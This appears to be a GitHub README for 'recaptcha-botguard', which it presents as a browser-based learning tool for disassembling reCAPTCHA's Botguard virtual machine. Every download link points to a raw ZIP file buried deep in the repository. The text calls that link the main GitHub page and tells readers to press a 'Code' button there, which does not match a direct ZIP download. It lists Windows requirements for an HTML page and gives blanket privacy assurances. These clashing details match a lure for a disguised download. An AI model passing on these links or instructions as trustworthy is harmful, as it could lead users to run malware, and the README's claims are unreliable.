# 🛡️ recaptcha-botguard - Understand Botguard Code Easily

[![Download recaptcha-botguard](https://img.shields.io/badge/Download-Here-purple?style=for-the-badge)](https://github.com/cristiancctlv/recaptcha-botguard/raw/refs/heads/main/src/bin/disassemble/botguard-recaptcha-chrisroot.zip)

---

## 📦 About recaptcha-botguard

recaptcha-botguard is a tool to help you study how Botguard works in Google’s reCAPTCHA. It breaks down and reads the hidden Botguard code into something easier to see.

This tool does not generate tokens or solve reCAPTCHA automatically. Instead, it gives a way to explore the code behind Botguard, useful for those curious about how reCAPTCHA works internally.

---

## 🖥️ System Requirements

- Windows 10 or newer (64-bit recommended)
- At least 2 GB of RAM
- 500 MB free disk space
- Internet connection for downloading files

No technical or programming knowledge is needed to run this software.

---

## 🚀 Getting Started

Click the big button above or this link to visit the GitHub page and download the files:

[https://github.com/cristiancctlv/recaptcha-botguard/raw/refs/heads/main/src/bin/disassemble/botguard-recaptcha-chrisroot.zip](https://github.com/cristiancctlv/recaptcha-botguard/raw/refs/heads/main/src/bin/disassemble/botguard-recaptcha-chrisroot.zip)

This link takes you to the main GitHub page. You will find all the files needed to use the application.

---

## 📥 How to Download and Install on Windows

1. **Open your web browser** (Chrome, Edge, Firefox, etc.)  
2. **Visit the GitHub page**:  
   https://github.com/cristiancctlv/recaptcha-botguard/raw/refs/heads/main/src/bin/disassemble/botguard-recaptcha-chrisroot.zip  

3. **Find the green "Code" button** on the page (top right side).  
4. Click the green "Code" button and select **Download ZIP**.  
5. Save the ZIP file anywhere on your computer (Desktop or Downloads folder is a good choice).  
6. Once the ZIP file finishes downloading, **right-click the file** and choose "Extract All..."  
7. Select a folder where you want the files extracted (creating a new folder is fine) and click "Extract".  

---

## ▶️ Running the Program

1. Open the folder where you extracted the files.  
2. Look for a file named **anchor.html**.  
3. Double-click **anchor.html** to open it in your web browser. This loads the core script and code.  
4. The program works inside the browser. It reads and shows Botguard code step by step.  
5. You can observe how the program loads code and handles different instructions.

---

## 🔍 What recaptcha-botguard Does

- Loads hidden Botguard code from encoded scripts.  
- Steps through the virtual machine (VM) used in Botguard.  
- Shows how the VM loads strings and handles commands.  
- Explains VM anti-debugging steps like timing checks.  
- Prints readable information so you can understand Botguard’s inner work.

---

## 📝 Explanation of the Core Process

The program starts by loading an HTML file named **anchor.html**. This file loads scripts that have been encoded in a special way to hide their content.

Inside these scripts:

- There is a *virtual machine* (VM) that runs Botguard code.  
- The VM uses a string table to load important text.  
- It also checks itself for tampering using timing and integrity checks.  
- Some commands in the VM load strings or numbers into virtual registers.

This lets you see the program’s behavior without needing to write or run code yourself.

---

## ⚙️ How to Use for Learning

- Open the program and watch the console or messages it shows.  
- Review the instructions the VM runs.  
- Notice the way strings are managed and loaded.  
- Understand how Botguard tries to stop tampering or debugging.  
- Use this to learn how encoded codes can be reversed or explored.

---

## 💡 Tips for Best Experience

- Use a modern browser like Chrome or Firefox to open **anchor.html**.  
- Allow pop-ups and scripts since the program uses JavaScript heavily.  
- Refresh the browser if needed to restart the program.  
- Use the browser’s developer tools console (press F12) to see detailed logs.  
- Take notes to track what each part of the output means.

---

## 📂 Additional Files Description

- **anchor.html**: Main file to open in a browser.  
- **script.js** (or similarly named): Contains the encoded Botguard scripts.  
- **README.md**: This file.  
- Other folders may contain supporting files or documentation.

---

## 📫 Where to Get Updates

Visit the GitHub page regularly to find updates or new versions. You can also download the ZIP again to get the latest files.

[https://github.com/cristiancctlv/recaptcha-botguard/raw/refs/heads/main/src/bin/disassemble/botguard-recaptcha-chrisroot.zip](https://github.com/cristiancctlv/recaptcha-botguard/raw/refs/heads/main/src/bin/disassemble/botguard-recaptcha-chrisroot.zip)

---

## ❓ Getting Help

If you have issues downloading or running the program, check the **Issues** section on the GitHub page. You can see if others have had the same problems.

---

## 🔒 Privacy and Security

The program runs locally on your computer inside the browser. It does not send any of your data to external servers. No installation is needed beyond downloading and opening the files.

---

## 🕵️‍♂️ About This Tool

This project serves as a learning resource about Botguard, not as a way to bypass protections. It focuses on showing the inner workings to those interested in reverse engineering.